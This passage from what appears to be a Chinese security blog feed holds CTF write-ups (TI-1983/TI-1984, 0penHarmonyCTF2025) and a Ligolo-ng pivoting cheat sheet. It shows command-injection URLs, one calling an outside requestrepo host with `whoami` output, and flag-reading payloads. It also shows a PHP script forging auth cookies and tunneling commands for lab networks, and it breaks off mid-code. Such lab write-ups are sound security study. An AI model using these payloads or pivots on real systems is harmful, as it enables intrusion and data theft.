class="string">&quot;static/index.html&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().decode()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/static&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fileserve</span>():</span><br><span class="line">    url = request.url</span><br><span class="line">    fpath = url.split(<span class="string">f&quot;static?&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line">    files = os.listdir(<span class="string">&quot;static&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> fpath <span class="keyword">not</span> <span class="keyword">in</span> files <span class="keyword">or</span> <span class="keyword">not</span> fpath.endswith(<span class="string">&quot;.tmpl&quot;</span>):</span><br><span class="line">        fpath = <span class="string">&quot;🐈.tmpl&quot;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">f&quot;static/<span class="subst">&#123;fpath&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_error</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;static/error.html&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().decode().replace(<span class="string">&quot;&#123;&#123;msg&#125;&#125;&quot;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ti-84&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_code</span>():</span><br><span class="line">    code = request.values.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    output_tmpl = request.values.get(<span class="string">&#x27;tmpl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(code) &gt; <span class="number">3</span> <span class="keyword">and</span> <span class="built_in">any</span>(c <span class="keyword">in</span> code <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;0123456789+*-/&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> render_error(<span class="string">&quot;This is a ~~Wendys~~ TI-84.&quot;</span>)</span><br><span class="line">    tmpl = code_tmpl</span><br><span class="line">    tmplcode = tmpl.replace(<span class="string">&quot;&#123;&#123;code&#125;&#125;&quot;</span>, code)</span><br><span class="line">    tmpfile = tempfile.NamedTemporaryFile(suffix=<span class="string">&quot;.py&quot;</span>, delete=<span class="literal">False</span>)</span><br><span class="line">    tmpfile.write(tmplcode.encode())</span><br><span class="line">    tmpfile.flush()</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;request.url_root&#125;</span>/static?<span class="subst">&#123;output_tmpl&#125;</span>.tmpl&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> c <span class="keyword">in</span> url <span class="keyword">if</span> <span class="built_in">ord</span>(c) &gt; <span class="number">127</span>) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> render_error(<span class="string">&quot;too many emojis... chill with the brainrot&quot;</span>)</span><br><span class="line">    out_tmpl = os.popen(<span class="string">f&quot;curl.exe -s <span class="subst">&#123;url&#125;</span>&quot;</span>).read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&#123;out&#125;&#125;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> out_tmpl:</span><br><span class="line">        <span class="keyword">return</span> render_error(<span class="string">&quot;Template must have &#123;&#123;out&#125;&#125;&quot;</span>)</span><br><span class="line">    tmpfile.close()</span><br><span class="line">    result = subprocess.run([<span class="string">&#x27;python.exe&#x27;</span>, tmpfile.name], text=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(tmpfile.name):</span><br><span class="line">        os.remove(tmpfile.name)</span><br><span class="line">    <span class="keyword">return</span> out_tmpl.replace(<span class="string">&quot;&#123;&#123;out&#125;&#125;&quot;</span>, result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>这里给了一个简单的flask服务，其中有模版替换之后进行渲染，然后本地访问进行测试等操作，我们可以很敏锐的发现两个漏洞，一个是命令拼接直接RCE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out_tmpl = os.popen(<span class="string">f&quot;curl.exe -s <span class="subst">&#123;url&#125;</span>&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>本地测试一下发现<code>&amp;</code>为分隔符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">a=os.popen(<span class="string">f&quot;whoami&amp; whoami &gt; static/1.txt&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>一个是SSTI</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> RestrictedPython <span class="keyword">import</span> compile_restricted</span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;&#123;code&#125;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">byte_code = compile_restricted(code, <span class="string">&#x27;&lt;inline&gt;&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(byte_code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>省去了平时的<code>&#123;&#123;&#125;&#125;</code>但是这里限制了模块，所以绕过进行RCE成为了几乎不可能的事情，再本地开启应用进行测试可以知道确实能够RCE的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ti-84?code=1&amp;tmpl=index.tmpl%26whoami &gt; static/2.txt%26index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/ti-84?code=1&amp;tmpl=index.tmpl%26curl https://epkveh22.requestrepo.com/%26index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/ti-84?code=1&amp;tmpl=index.tmpl%26curl https://epkveh22.requestrepo.com/`whoami`%26index</span><br></pre></td></tr></table></figure><p>看Dockerfile也看得出来是Windows主机，</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> mcr.microsoft.com/windows/servercore:ltsc2022</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Description=<span class="string">&quot;Python&quot;</span> Vendor=<span class="string">&quot;Python Software Foundation&quot;</span> Version=<span class="string">&quot;3.10.0&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> powershell.exe -Command \</span></span><br><span class="line"><span class="language-bash">    <span class="variable">$ErrorActionPreference</span> = <span class="string">&#x27;Stop&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; \</span></span><br><span class="line"><span class="language-bash">    wget https://www.python.org/ftp/python/3.10.0/python-3.10.0.exe -OutFile c:\python-3.10.0.exe ; \</span></span><br><span class="line"><span class="language-bash">    Start-Process c:\python-3.10.0.exe -ArgumentList <span class="string">&#x27;/quiet InstallAllUsers=1 PrependPath=1&#x27;</span> -Wait ; \</span></span><br><span class="line"><span class="language-bash">    Remove-Item c:\python-3.10.0.exe -Force</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> powershell.exe -Command \</span></span><br><span class="line"><span class="language-bash">    <span class="variable">$ErrorActionPreference</span> = <span class="string">&#x27;Stop&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; \</span></span><br><span class="line"><span class="language-bash">    wget https://curl.se/windows/dl-8.14.1_1/curl-8.14.1_1-win64-mingw.zip -OutFile c:\curl.zip ; \</span></span><br><span class="line"><span class="language-bash">    Expand-Archive c:\curl.zip -DestinationPath C:\curl ; \</span></span><br><span class="line"><span class="language-bash">    Remove-Item c:\curl.zip -Force</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt /app/requirements.txt</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> server.py /app/server.py</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.txt /app/flag.txt</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> static /app/static/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> code_tmpl.py /app/code_tmpl.py</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> move C:\curl\curl-8.14.1_1-win64-mingw\bin\curl.exe C:\app\curl.exe</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;import os; os.rename(&#x27;flag.txt&#x27;, f&#x27;flag_&#123;os.urandom(8).hex()&#125;.txt&#x27;)&quot;</span>]</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> [<span class="string">&quot;pip&quot;</span>, <span class="string">&quot;install&quot;</span>, <span class="string">&quot;-r&quot;</span>, <span class="string">&quot;requirements.txt&quot;</span>]</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> net user /add chall</span></span><br><span class="line"><span class="keyword">USER</span> chall</span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;-X&quot;</span>, <span class="string">&quot;utf8&quot;</span>, <span class="string">&quot;server.py&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>所以我们外带这里反引号不会识别成功，直接命令执行即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://misc-ti-1983-qmr42v1n.windows.smiley.cat/ti-84?code=1&amp;tmpl=index.tmpl%26dir%26index</span><br><span class="line"></span><br><span class="line">https://misc-ti-1983-qmr42v1n.windows.smiley.cat/ti-84?code=1&amp;tmpl=index.tmpl%26type flag_4dfa54cf005d9fea.txt%26index</span><br></pre></td></tr></table></figure><h2 id="misc-TI-1984"><a href="#misc-TI-1984" class="headerlink" title="misc&#x2F;TI-1984"></a>misc&#x2F;TI-1984</h2><p><a href="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/">https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/</a></p><p>what can i say，找不到可以利用的curl的参数，</p><p><a href="https://hackerone.com/reports/2550951">https://hackerone.com/reports/2550951</a></p><p>和上题不同的地方就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run([<span class="string">&#x27;curl.exe&#x27;</span>, <span class="string">&#x27;-s&#x27;</span>, url], stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.decode()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.tmpl%EF%BC%82%20-s%20file:///app/%20%EF%BC%82index</span><br><span class="line"></span><br><span class="line">index.tmpl%26dir%26index</span><br></pre></td></tr></table></figure><p>没成功最后，等待复现</p>]]></content>
    
    
    <summary type="html">鸡哥骂我呜呜</summary>
    
    
    
    <category term="赛题" scheme="https://baozongwi.xyz/categories/%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="xss" scheme="https://baozongwi.xyz/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Ligolo-ng搭建内网TUN模式代理</title>
    <link href="https://baozongwi.xyz/posts/4f84c84.html"/>
    <id>https://baozongwi.xyz/posts/4f84c84.html</id>
    <published>2025-06-09T12:52:43.000Z</published>
    <updated>2025-08-12T14:04:23.208Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/nicocha30/ligolo-ng/">https://github.com/nicocha30/ligolo-ng/</a></p><h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>今天玩云镜的时候，和Byxs20师傅一起打了一个靶场，聊了聊一些工具，他给我推荐了这个来搭建代理，其实本来不是很情愿使用这个东西的，但是他toDesk给我硬塞了，分享到SU群里面，原来eson哥早就告诉我了这个东西，那现在来写写命令(方便以后渗透的时候CP)吧~</p><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>首先在靶机开启监听等待连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./agent -<span class="built_in">bind</span> 0.0.0.0:10010 &gt; agent.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>本地kali运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./proxy -selfcert -laddr <span class="string">&quot;0.0.0.0:10001&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># IP为靶机IP</span></span><br><span class="line">connect_agent --ip 39.98.112.84:10010</span><br></pre></td></tr></table></figure><p>然后我们创建一个网卡即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 得知命令使用</span></span><br><span class="line"><span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出网卡</span></span><br><span class="line">interface_list</span><br><span class="line"></span><br><span class="line">interface_create --name <span class="built_in">test</span></span><br><span class="line">session</span><br><span class="line">autoroute</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/6/Ligolo-ng%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91TUN%E6%A8%A1%E5%BC%8F%E4%BB%A3%E7%90%86/QQ20250610-203313.jpg" alt="1"></p><p>随便测试一下试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.1.15/24</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/6/Ligolo-ng%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91TUN%E6%A8%A1%E5%BC%8F%E4%BB%A3%E7%90%86/bao2ongw1.jpg" alt="1"></p><p>确实成功了</p><h2 id="开启socks"><a href="#开启socks" class="headerlink" title="开启socks"></a>开启socks</h2><p><a href="https://github.com/ginuerzh/gost">https://github.com/ginuerzh/gost</a> 利用gost开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./gost -L=socks://:1080 &gt; gost.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否开启</span></span><br><span class="line">ss -luntp</span><br></pre></td></tr></table></figure><p>接下来拿到本地IP即可，需要是宿主机和虚拟机能够互通的，NAT的虚拟机和宿主机不是一个网段的，这里直接给虚拟机添加一个网卡即可，然后正常代理</p><p><img src="/../images/achieve/2025/6/Ligolo-ng%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91TUN%E6%A8%A1%E5%BC%8F%E4%BB%A3%E7%90%86/QQ20250610-211556.jpg" alt="1"></p><p><img src="/../images/achieve/2025/6/Ligolo-ng%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91TUN%E6%A8%A1%E5%BC%8F%E4%BB%A3%E7%90%86/QQ20250610-211534.jpg" alt="1"></p><h2 id="多层代理"><a href="#多层代理" class="headerlink" title="多层代理"></a>多层代理</h2><p>其实细心的同学已经发现了，这玩意就和stowaway差不多，所以依旧是正向+多层反向即可，在我们已经得到第一个网段的控制权，想要继续深入时，那么先添加一个监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 172.23.4.32为第一个网段控制机内网IP</span></span><br><span class="line">listener_add --addr 172.23.4.32:10001 --to 127.0.0.1:10001 --tcp</span><br></pre></td></tr></table></figure><p>在第二个网段的入口机进行反向链接即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\agent.exe -connect 172.23.4.32:10001 -ignore-cert</span><br><span class="line">session</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/6/Ligolo-ng%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91TUN%E6%A8%A1%E5%BC%8F%E4%BB%A3%E7%90%86/QQ20250610-223442.jpg" alt="1"></p><p>回到控制端添加新网卡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface_create --name test1</span><br><span class="line"></span><br><span class="line">autoroute</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/6/Ligolo-ng%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91TUN%E6%A8%A1%E5%BC%8F%E4%BB%A3%E7%90%86/QQ20250610-223959.jpg" alt="1"></p><p>这里就体现一个比较强大的功能了，虽然我们使用的是不同的网卡，但是一个socks5就可以通往所有网段，</p><p><img src="/../images/achieve/2025/6/Ligolo-ng%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91TUN%E6%A8%A1%E5%BC%8F%E4%BB%A3%E7%90%86/QQ20250610-224121.jpg" alt="1"></p><h2 id="收尾工作-删除网卡"><a href="#收尾工作-删除网卡" class="headerlink" title="收尾工作(删除网卡)"></a>收尾工作(删除网卡)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">interface_del --name <span class="built_in">test</span> </span><br><span class="line">interface_del --name test1</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>解决了一些go语言编写的工具由于底层代码原因无法使用socks代理的问题，速度也是真的快，只不过这个工具其实还有缺点就是无法成功去一直搭建正向代理，和stowaway一样，不过我知道一个工具可以，Vshell，那玩意操作异常简单，所以大家自己随便玩玩就会了，中途‎Byxs20师傅帮我远程了两次，因为这东西网上资料太少了</p><p>爱你B神</p>]]></content>
    
    
    <summary type="html">非常好用的代理工具</summary>
    
    
    
    <category term="talk" scheme="https://baozongwi.xyz/categories/talk/"/>
    
    
    <category term="工具" scheme="https://baozongwi.xyz/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>0penHarmonyCTF2025</title>
    <link href="https://baozongwi.xyz/posts/993c842d.html"/>
    <id>https://baozongwi.xyz/posts/993c842d.html</id>
    <published>2025-06-07T04:12:57.000Z</published>
    <updated>2025-08-08T03:48:14.524Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Layers-of-Compromise"><a href="#Layers-of-Compromise" class="headerlink" title="Layers of Compromise"></a>Layers of Compromise</h2><p>扫目录得到配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># .htaccess</span><br><span class="line">Options -Indexes</span><br><span class="line">php_flag display_errors off</span><br><span class="line"></span><br><span class="line">&lt;Files &quot;config.php&quot;&gt;</span><br><span class="line">    Order Allow,Deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line"># 限制访问API目录</span><br><span class="line">&lt;FilesMatch &quot;^debug\.php$&quot;&gt;</span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>后面发现没啥用，首先弱密码登录后台<code>user\password123</code>，登录进去之后换Cookie为两个<code>admin</code>，想要查看日志，但是直接跳转出去了，发现目录<code>/secrettttts/</code>里面可以拿到开发者token，现在去扫描，得到<code>token.txt</code>，得到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">7f8a1a4b3c7d9e6f2b5s8d7f9g6h5j4k3l2m1n</span><br><span class="line">--auth.php</span><br><span class="line">if (isset($_COOKIE[&#x27;auth_token&#x27;])) &#123;</span><br><span class="line">    $auth_data = unserialize(base64_decode($_COOKIE[&#x27;auth_token&#x27;]));</span><br><span class="line">    if ($auth_data[&#x27;username&#x27;] === &#x27;dev&#x27; &amp;&amp; </span><br><span class="line">        $auth_data[&#x27;hash&#x27;] === md5(&#x27;dev&#x27; . $CONFIG[&#x27;auth_key&#x27;])) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--</span><br><span class="line">&#x27;username&#x27;=&gt;&#x27;dev&#x27; &#x27;auth_key&#x27; =&gt; &#x27;S3cr3tK3y!2023&#x27;</span><br></pre></td></tr></table></figure><p>让AI写个文件伪造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 认证信息</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;dev&#x27;</span>;</span><br><span class="line"><span class="variable">$auth_key</span> = <span class="string">&#x27;S3cr3tK3y!2023&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算hash值</span></span><br><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$username</span> . <span class="variable">$auth_key</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造认证数据数组</span></span><br><span class="line"><span class="variable">$auth_data</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">    <span class="string">&#x27;hash&#x27;</span> =&gt; <span class="variable">$hash</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化并base64编码</span></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$auth_data</span>);</span><br><span class="line"><span class="variable">$auth_token</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serialized</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;生成的认证信息:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Username: &quot;</span> . <span class="variable">$username</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Auth Key: &quot;</span> . <span class="variable">$auth_key</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hash: &quot;</span> . <span class="variable">$hash</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Serialized: &quot;</span> . <span class="variable">$serialized</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Auth Token (Cookie值): &quot;</span> . <span class="variable">$auth_token</span> . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证逻辑（模拟服务器端验证）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;验证测试:\n&quot;</span>;</span><br><span class="line"><span class="variable">$decoded</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$auth_token</span>);</span><br><span class="line"><span class="variable">$unserialized</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$decoded</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$unserialized</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;dev&#x27;</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$unserialized</span>[<span class="string">&#x27;hash&#x27;</span>] === <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;dev&#x27;</span> . <span class="variable">$auth_key</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;✓ 认证成功！\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;✗ 认证失败！\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cookie设置示例</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\nCookie设置示例:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;setcookie(&#x27;auth_token&#x27;, &#x27;<span class="subst">$auth_token</span>&#x27;, time() + 3600);\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者直接在浏览器中设置</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n浏览器开发者工具中设置:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;document.cookie = &#x27;auth_token=<span class="subst">$auth_token</span>&#x27;;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于日志太多，重开靶机，但是进来之后发现还是这么多，并且知道token是静态的，看到查询的时候有参数</p><p><img src="/../images/achieve/2025/6/0penHarmonyCTF2025/QQ20250607-121819.jpg" alt="1"></p><p>抓包测试RCE接口，目的闭合前面读取文件，后面拼接命令，测试发现下图</p><p><img src="/../images/achieve/2025/6/0penHarmonyCTF2025/QQ20250607-121530.jpg" alt="1"></p><p>那说明必须带引号，测试出来空格被过滤，绕过之后成功RCE</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 